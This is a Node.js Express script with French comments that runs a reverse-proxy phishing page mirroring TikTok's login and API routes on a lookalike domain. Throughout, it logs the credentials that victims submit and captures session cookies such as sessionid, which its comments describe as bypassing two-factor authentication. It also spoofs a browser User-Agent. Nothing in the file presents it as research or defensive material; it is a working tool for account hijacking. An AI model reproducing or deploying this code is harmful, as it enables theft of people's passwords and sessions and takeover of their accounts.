const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.static(path.join(__dirname)));

const proxyOptions = {
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    autoRewrite: true, // Réécrit les redirections automatiquement
    followRedirects: true,
    cookieDomainRewrite: {
        ".tiktok.com": "noreplytiktok.onrender.com",
        "tiktok.com": "noreplytiktok.onrender.com"
    },
    onProxyReq: (proxyReq, req, res) => {
        // --- CAPTURE DES IDENTIFIANTS ---
        if (req.method === 'POST') {
            let body = '';
            req.on('data', chunk => { body += chunk; });
            req.on('end', () => {
                if(body) {
                    console.log("\n[!] SAISIE INTERCEPTÉE :");
                    console.log(decodeURIComponent(body));
                    console.log("-----------------------\n");
                }
            });
        }
        // Simulation d'un navigateur réel
        proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
    },
    onProxyRes: (proxyRes, req, res) => {
        // --- CAPTURE DU JETON DE SESSION (2FA BYPASS) ---
        const cookies = proxyRes.headers['set-cookie'];
        if (cookies) {
            console.log("\n[X] FLUX DE COOKIES DÉTECTÉ");
            cookies.forEach(c => {
                // Si on voit passer le sessionid, c'est que la session est ouverte (2FA réussi)
                if (c.includes('sessionid') || c.includes('ttwid') || c.includes('sid')) {
                    console.log(">>> JETON RÉCUPÉRÉ : " + c.split(';')[0]);
                }
            });
        }
    }
};

// On applique le proxy sur TOUTES les routes pour rester en mode "Miroir"
// Cela permet à l'utilisateur de continuer sa navigation sur ton domaine
app.use('/login', createProxyMiddleware(proxyOptions));
app.use('/passport', createProxyMiddleware(proxyOptions));
app.use('/api', createProxyMiddleware(proxyOptions));

app.listen(PORT, () => {
    console.log("MOTEUR BACOPS EN LIGNE - MODE TUNNEL ACTIF");
});
